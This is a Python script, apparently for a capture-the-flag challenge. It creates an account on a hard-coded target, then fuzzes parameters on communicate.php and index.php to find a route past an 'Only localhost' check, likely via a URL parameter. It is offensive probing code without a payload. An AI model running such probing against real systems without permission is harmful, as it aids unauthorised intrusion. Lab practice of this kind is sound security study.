#!/usr/bin/env python3
import requests
import random
import string

TARGET = "http://94.237.49.23:45329"

def random_string(length=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

# Crear usuario
session = requests.Session()
username = random_string()
password = random_string()

data = {'name': 'user', 'username': username, 'password': password}
session.post(f"{TARGET}/register.php", data=data)
session.post(f"{TARGET}/login.php", data={'username': username, 'password': password})

print(f"[*] Usuario: {username}:{password}\n")

# Fuzzing de parámetros en communicate.php
print("[*] Fuzzing communicate.php...")

params_to_test = {
    'url': 'http://motherland.com/',
    'data': {'test': 'value'},
    'key': 'test',
    'value': 'value',
}

# Probar enviando de diferentes formas
print("\n[1] Con data como dict directo:")
resp = session.post(f"{TARGET}/communicate.php", data=params_to_test, timeout=5)
print(f"    Status: {resp.status_code}, Len: {len(resp.text)}")

print("\n[2] Con data[key] y value separados:")
resp = session.post(f"{TARGET}/communicate.php", data={
    'url': 'http://motherland.com/',
    'key': 'action',
    'value': 'edit'
}, timeout=5)
print(f"    Status: {resp.status_code}, Len: {len(resp.text)}")

# Probar parámetros GET
print("\n[3] Con GET en lugar de POST:")
resp = session.get(f"{TARGET}/communicate.php?url=http://motherland.com/", timeout=5)
print(f"    Status: {resp.status_code}, Len: {len(resp.text)}")

# Probar con $_REQUEST en lugar de $_POST
print("\n[4] Mezcla GET y POST:")
resp = session.post(f"{TARGET}/communicate.php?url=http://motherland.com/", data={
    'data[action]': 'edit',
    'data[new_name]': 'test'
}, timeout=5)
print(f"    Status: {resp.status_code}, Len: {len(resp.text)}")

# Fuzzing de index.php
print("\n[*] Fuzzing index.php...")

print("\n[1] Sin action:")
resp = session.post(f"{TARGET}/", data={'new_name': 'test'})
print(f"    Status: {resp.status_code}")
if "Only localhost" in resp.text:
    print(f"    [-] Only localhost error")

print("\n[2] Con action pero sin new_name:")
resp = session.post(f"{TARGET}/", data={'action': 'edit'})
print(f"    Status: {resp.status_code}")

print("\n[3] Con otros valores de action:")
for action in ['delete', 'update', 'view', 'test', '']:
    resp = session.post(f"{TARGET}/", data={'action': action, 'new_name': 'test'})
    if "Only localhost" not in resp.text and "Yo," in resp.text:
        print(f"    [!] Action '{action}' dio respuesta diferente")
